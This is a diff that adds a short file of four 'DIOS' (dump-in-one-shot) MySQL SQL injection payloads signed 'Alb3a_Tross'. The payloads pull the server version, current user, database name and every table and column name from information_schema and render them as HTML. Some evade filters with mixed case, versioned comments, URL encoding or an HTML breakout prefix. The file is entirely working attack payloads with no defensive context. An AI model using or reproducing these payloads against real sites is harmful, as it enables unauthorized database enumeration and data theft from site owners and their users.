@@ -1,0 +1,33 @@
+Dios:-1
+
+concat(0x3c68313e496e6a656374656420627920416c6233615f54726f73733c2f68313e,0x3c62723e,0x56455253494f4e3d3d3e,version(),0x3c62723e,0x555345523d3d3e,user(),0x3c62723e,0x44617461626173653d3d3e,database(),0x3c62723e,0x3c62723e,(group_concat(0x3c62723e,table_name,0x3a3a,column_name)))
+
+
+from information_schema.columns where table_schema like database()
+
+
+Dios:-2
+
+CoNcAt('{ Alb3a_Tross }',0x3c62723e,0x55736572203a3a20,user(),0x3c62723e,0x56657273696f6e203a3a20,version(),0x3c62723e,0x4461746162617365203a3a20,database(),0x3c62723e,GRoUp_cOnCat(0x3c62723e,binary(/*!50000table_name*/),0x203a3a20,binary(/*!50000column_name*/)))
+
+
+
+/*!50000FROM*/ /*!12345INFORMATION_SCHEMA.columns*/ where table_schema not like 0x696e666f726d6174696f6e5f736368656d61
+
+
+
+Dios:-3
+
+concat%280x4e616d65203a3a20546f75636820627920416c6233615f54726f7373,0x3c62723e,0x4461746162617365,0x203a3a20,database%28%29,0x3c62723e,0x55736572,0x203a3a20,user%28%29,0x3c62723e,0x56657273696f6e,0x203a3a20,version%28%29,0x3c62723e,group_concat%280x3c62723e,0x5b5d20,table_name,0x203a3a20,column_name%29%29
+
+
+from information_schema.columns where table_schema=database%28%29
+
+
+
+Dios-4
+
+concat(0x223e273e3c2f7469746c653e,'<font color=red>','Inject By Alb3a_Tross','<br>','<br>','Version = ',version(),'<br>','User = ',user(),'<br>','Database = ',database(),'<br><br>',group_concat(0x3c62723e,'~ ',table_name,' = ',column_name))
+
+
+ from information_schema.columns where table_schema=database()
